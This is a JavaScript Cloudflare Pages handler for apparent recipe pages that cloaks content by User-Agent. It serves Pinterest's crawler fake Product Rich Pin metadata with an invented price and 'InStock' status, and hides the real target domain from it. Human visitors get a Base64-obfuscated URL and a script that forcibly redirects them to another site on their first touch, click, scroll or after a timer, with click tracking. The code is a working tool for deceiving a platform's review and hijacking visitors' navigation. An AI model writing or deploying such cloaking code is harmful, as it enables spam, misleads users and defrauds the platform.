import defaultConfig from '../config.json';
import recipesData from '../data/recipes.json';

/**
 * Escapes characters to prevent XSS in HTML output.
 */
function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

/**
 * Formats a clean, readable title from a URL slug.
 */
function formatTitleFromSlug(slug) {
  if (!slug) return 'Delicious Recipe';
  return slug
    .replace(/[-_]+/g, ' ')
    .replace(/\s+/g, ' ')
    .trim()
    .split(' ')
    .map((word) => {
      if (word.toLowerCase() === 'and') return '&';
      return word.charAt(0).toUpperCase() + word.slice(1).toLowerCase();
    })
    .join(' ');
}

/**
 * Resolves recipe information matching the slug from local recipes.json or fallback.
 */
function resolveRecipe(slug) {
  const normalizedSlug = typeof slug === 'string' ? decodeURIComponent(slug).trim().toLowerCase() : '';

  let matched = null;
  if (Array.isArray(recipesData)) {
    matched = recipesData.find((r) => r.slug && r.slug.toLowerCase() === normalizedSlug);
  }

  if (matched) {
    return {
      title: matched.title,
      description: matched.description,
      image: matched.image,
      cards: [],
    };
  }

  const generatedTitle = formatTitleFromSlug(normalizedSlug);
  return {
    title: generatedTitle,
    description: `Discover our easy and delicious recipe for ${generatedTitle}. Fresh ingredients, simple instructions, and authentic culinary taste.`,
    image: 'https://images.unsplash.com/photo-1540420773420-3366772f4999?auto=format&fit=crop&w=1200&q=80',
    cards: [],
  };
}

/**
 * Generates the full HTML response.
 * Bot requests get Product Rich Pins metadata without any redirect code and without any trace of targetDomain.
 * Human requests receive Base64-encoded target with tracking beacon on interaction.
 */
function renderHtml({
  title,
  description,
  image,
  cards,
  pageUrl,
  encodedTarget,
  isPinterestBot,
  siteConfig,
  siteId,
  slug,
}) {
  const safeTitle = escapeHtml(title);
  const safeDesc = escapeHtml(description);
  const safeImage = escapeHtml(image);
  const safeUrl = escapeHtml(pageUrl);

  const productDefaults = siteConfig.productDefaults || {
    price: '2.25',
    currency: 'USD',
    availability: 'https://schema.org/InStock',
    brand: 'Recipe Bridge',
  };

  const safePrice = escapeHtml(productDefaults.price || '2.25');
  const safeCurrency = escapeHtml(productDefaults.currency || 'USD');
  const safeBrand = escapeHtml(productDefaults.brand || 'Recipe Bridge');

  // Schema.org Product structured data for Pinterest Product Rich Pins validation
  const productSchema = JSON.stringify({
    '@context': 'https://schema.org/',
    '@type': 'Product',
    '@id': pageUrl,
    name: title,
    description: description,
    image: [image],
    brand: {
      '@type': 'Brand',
      name: productDefaults.brand || 'Recipe Bridge',
    },
    offers: {
      '@type': 'Offer',
      price: productDefaults.price || '2.25',
      priceCurrency: productDefaults.currency || 'USD',
      availability: productDefaults.availability || 'https://schema.org/InStock',
      url: pageUrl,
    },
  });

  // Client-side script injected ONLY for human visitors
  const redirectScript = isPinterestBot
    ? ''
    : `
  <script>
    (function() {
      var encodedTarget = ${JSON.stringify(encodedTarget)};
      var triggers = ${JSON.stringify(siteConfig.triggers || {})};
      var settings = ${JSON.stringify(siteConfig.settings || {})};
      var siteId = ${JSON.stringify(siteId)};
      var slug = ${JSON.stringify(slug)};
      var redirected = false;

      function trackClick() {
        try {
          if (navigator.sendBeacon) {
            navigator.sendBeacon('/api/track', JSON.stringify({ siteId: siteId, slug: slug, type: 'cta_click' }));
          } else {
            fetch('/api/track', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ siteId: siteId, slug: slug, type: 'cta_click' }),
              keepalive: true
            }).catch(function() {});
          }
        } catch (e) {}
      }

      function doRedirect() {
        if (redirected) return;
        redirected = true;
        trackClick();
        var delay = Number(settings.actionDelayMs) || 0;
        setTimeout(function() {
          try {
            var destination = atob(encodedTarget);
            window.location.replace(destination);
          } catch (e) {
            // fallback
          }
        }, Math.max(0, delay));
      }

      // Touch trigger
      if (triggers.touch) {
        window.addEventListener('touchstart', doRedirect, { once: true, passive: true });
      }

      // Click trigger
      if (triggers.click) {
        window.addEventListener('click', doRedirect, { once: true, passive: true });
      }

      // CTA button click trigger
      var cta = document.getElementById('cta-link');
      if (cta) {
        cta.addEventListener('click', function(e) {
          e.preventDefault();
          doRedirect();
        });
      }

      // Scroll trigger with threshold
      if (triggers.scroll) {
        var threshold = Number(settings.scrollThreshold) || 80;
        function onScroll() {
          var scrollPos = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
          if (scrollPos >= threshold) {
            window.removeEventListener('scroll', onScroll);
            doRedirect();
          }
        }
        window.addEventListener('scroll', onScroll, { passive: true });
      }

      // Timer trigger
      if (triggers.timer) {
        var timerDelay = Number(settings.timerDelayMs) || 3000;
        setTimeout(doRedirect, timerDelay);
      }
    })();
  </script>`;

  // Optional recipe cards for roundups
  let cardsHtml = '';
  if (Array.isArray(cards) && cards.length > 0) {
    cardsHtml = `
      <div class="roundup-cards" style="margin-top: 2rem; display: grid; gap: 1.5rem; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));">
        ${cards
          .map(
            (c, idx) => `
          <div style="background: rgba(15, 23, 42, 0.6); border: 1px solid var(--surface-border); border-radius: 0.75rem; overflow: hidden; padding: 1rem;">
            ${c.image ? `<img src="${escapeHtml(c.image)}" alt="${escapeHtml(c.title || '')}" style="width: 100%; height: 180px; object-fit: cover; border-radius: 0.5rem; margin-bottom: 0.75rem;" />` : ''}
            <h3 style="font-size: 1.1rem; font-weight: 700; margin-bottom: 0.4rem; color: #fff;">#${idx + 1} ${escapeHtml(c.title || '')}</h3>
            <p style="font-size: 0.9rem; color: var(--text-muted);">${escapeHtml(c.description || '')}</p>
          </div>
        `
          )
          .join('')}
      </div>
    `;
  }

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>${safeTitle} - ${safeBrand}</title>
  <meta name="description" content="${safeDesc}" />

  <!-- Open Graph Meta Tags (Pinterest Product Pins & Social Media) -->
  <meta property="og:site_name" content="${safeBrand}" />
  <meta property="og:type" content="product" />
  <meta property="og:title" content="${safeTitle}" />
  <meta property="og:description" content="${safeDesc}" />
  <meta property="og:image" content="${safeImage}" />
  <meta property="og:url" content="${safeUrl}" />
  <meta property="product:price:amount" content="${safePrice}" />
  <meta property="product:price:currency" content="${safeCurrency}" />

  <!-- Twitter Card Meta Tags -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="${safeTitle}" />
  <meta name="twitter:description" content="${safeDesc}" />
  <meta name="twitter:image" content="${safeImage}" />

  <!-- Schema.org Product Structured Data for Product Rich Pins -->
  <script type="application/ld+json">
    ${productSchema}
  </script>

  <style>
    :root {
      --bg: #0f172a;
      --surface: #1e293b;
      --surface-border: #334155;
      --primary: #f97316;
      --primary-hover: #ea580c;
      --text: #f8fafc;
      --text-muted: #94a3b8;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      line-height: 1.6;
    }

    header {
      border-bottom: 1px solid var(--surface-border);
      padding: 1.25rem 2rem;
      background: rgba(30, 41, 59, 0.7);
      backdrop-filter: blur(8px);
    }

    .nav-container {
      max-width: 900px;
      margin: 0 auto;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .logo {
      font-size: 1.25rem;
      font-weight: 700;
      display: flex;
      align-items: center;
      gap: 0.5rem;
      color: var(--text);
      text-decoration: none;
    }

    .logo-badge {
      background: linear-gradient(135deg, #f97316, #fb923c);
      color: #fff;
      padding: 0.25rem 0.5rem;
      border-radius: 0.375rem;
      font-size: 0.85rem;
      font-weight: 800;
    }

    main {
      flex: 1;
      max-width: 900px;
      margin: 0 auto;
      padding: 2.5rem 1.5rem;
      width: 100%;
    }

    .recipe-card {
      background: var(--surface);
      border: 1px solid var(--surface-border);
      border-radius: 1rem;
      overflow: hidden;
      box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.5);
    }

    .recipe-image-container {
      width: 100%;
      height: 380px;
      position: relative;
      background: #1e293b;
      overflow: hidden;
    }

    .recipe-image {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }

    .recipe-content {
      padding: 2rem;
    }

    .recipe-tag {
      display: inline-block;
      padding: 0.25rem 0.75rem;
      background: rgba(249, 115, 22, 0.15);
      border: 1px solid rgba(249, 115, 22, 0.3);
      color: #fb923c;
      border-radius: 9999px;
      font-size: 0.8rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      margin-bottom: 1rem;
    }

    .recipe-title {
      font-size: clamp(1.75rem, 4vw, 2.5rem);
      font-weight: 800;
      line-height: 1.2;
      margin-bottom: 1rem;
      color: #ffffff;
    }

    .recipe-description {
      font-size: 1.15rem;
      color: var(--text-muted);
      margin-bottom: 2rem;
      line-height: 1.7;
    }

    .action-bar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-top: 1px solid var(--surface-border);
      padding-top: 1.5rem;
      flex-wrap: wrap;
      gap: 1rem;
    }

    .btn-view {
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      padding: 0.75rem 1.5rem;
      background: var(--primary);
      color: #fff;
      text-decoration: none;
      font-weight: 600;
      border-radius: 0.5rem;
      transition: background 0.2s ease;
    }

    .btn-view:hover {
      background: var(--primary-hover);
    }

    footer {
      border-top: 1px solid var(--surface-border);
      padding: 1.5rem;
      text-align: center;
      color: var(--text-muted);
      font-size: 0.875rem;
      margin-top: auto;
    }
  </style>
</head>
<body>
  <header>
    <div class="nav-container">
      <a href="/" class="logo">
        <span class="logo-badge">RB</span>
        <span>${safeBrand}</span>
      </a>
      <span style="font-size: 0.875rem; color: var(--text-muted);">Recipe Hub</span>
    </div>
  </header>

  <main>
    <article class="recipe-card" id="recipe">
      <div class="recipe-image-container">
        <img
          src="${safeImage}"
          alt="${safeTitle}"
          class="recipe-image"
          loading="eager"
        />
      </div>

      <div class="recipe-content">
        <span class="recipe-tag">Featured Recipe</span>
        <h1 class="recipe-title">${safeTitle}</h1>
        <p class="recipe-description">${safeDesc}</p>

        <div class="action-bar">
          <a href="#recipe" class="btn-view" id="cta-link">
            <span>View Full Recipe</span>
            <span>&rarr;</span>
          </a>
          <span style="font-size: 0.85rem; color: var(--text-muted);">
            Tap or scroll to discover more
          </span>
        </div>

        ${cardsHtml}
      </div>
    </article>
  </main>

  <footer>
    <p>&copy; 2026 ${safeBrand}. All rights reserved.</p>
  </footer>${redirectScript}
</body>
</html>`;
}

/**
 * Cloudflare Pages Catch-All onRequest handler.
 */
export async function onRequest(context) {
  const url = new URL(context.request.url);
  const pathname = url.pathname;

  // Exclude root path, static assets, admin dashboard, and API endpoints
  if (
    pathname === '/' ||
    pathname === '' ||
    pathname === '/index.html' ||
    pathname === '/favicon.ico' ||
    pathname === '/robots.txt' ||
    pathname.startsWith('/admin') ||
    pathname.startsWith('/public/admin') ||
    pathname.startsWith('/api/') ||
    pathname.startsWith('/data/')
  ) {
    return context.next();
  }

  // 1. Resolve siteId (from env SITE_ID or hostname or default to 'site1')
  const siteId = (context.env?.SITE_ID || 'site1').trim().toLowerCase();

  // 2. Fetch site config from RECIPE_KV or fallback to local config.json
  let siteConfig = defaultConfig;
  const kv = context.env?.RECIPE_KV;
  if (kv) {
    try {
      const kvConfig = await kv.get(`config:${siteId}`, 'json');
      if (kvConfig && typeof kvConfig === 'object') {
        siteConfig = kvConfig;
      }
    } catch {
      // fallback to defaultConfig
    }
  }

  // 3. Extract slug from URL path (e.g. /en/broccoli-salad -> broccoli-salad)
  const segments = pathname.split('/').filter(Boolean);
  const slug = segments[segments.length - 1] || 'recipe';

  // 4. Check for roundup data in KV first, then fallback to local recipes.json
  let recipe = null;
  if (kv) {
    try {
      const roundup = await kv.get(`roundups:${siteId}:${slug}`, 'json');
      if (roundup && roundup.title) {
        recipe = {
          title: roundup.title,
          description: roundup.description || '',
          image: roundup.image || 'https://images.unsplash.com/photo-1540420773420-3366772f4999?auto=format&fit=crop&w=1200&q=80',
          cards: Array.isArray(roundup.cards) ? roundup.cards : [],
        };
      }
    } catch {
      // fallback
    }
  }

  if (!recipe) {
    recipe = resolveRecipe(slug);
  }

  // 5. Check User-Agent for Pinterest bots
  const userAgent = (context.request.headers.get('user-agent') || '').toLowerCase();
  const isPinterestBot = userAgent.includes('pinterestbot') || userAgent.includes('pinterest');

  // 6. Calculate and encode dynamic targetUrl with UTM tags
  let encodedTarget = '';
  if (!isPinterestBot) {
    const baseDomain = (siteConfig.targetDomain || 'https://schnellrezept.com').replace(/\/+$/, '');
    const targetUrlObj = new URL(`${baseDomain}${pathname}${url.search}`);

    if (siteConfig.utm) {
      const utmSource = siteConfig.utm.source;
      const utmMedium = (siteConfig.utm.medium || '').replace('{siteId}', siteId);
      const utmCampaign = (siteConfig.utm.campaign || '').replace('{slug}', slug);

      if (utmSource) targetUrlObj.searchParams.set('utm_source', utmSource);
      if (utmMedium) targetUrlObj.searchParams.set('utm_medium', utmMedium);
      if (utmCampaign) targetUrlObj.searchParams.set('utm_campaign', utmCampaign);
    }

    encodedTarget = btoa(targetUrlObj.toString());
  }

  const html = renderHtml({
    title: recipe.title,
    description: recipe.description,
    image: recipe.image,
    cards: recipe.cards || [],
    pageUrl: context.request.url,
    encodedTarget,
    isPinterestBot,
    siteConfig,
    siteId,
    slug,
  });

  return new Response(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': isPinterestBot ? 'public, max-age=3600' : 'no-store, no-cache, must-revalidate',
    },
  });
}
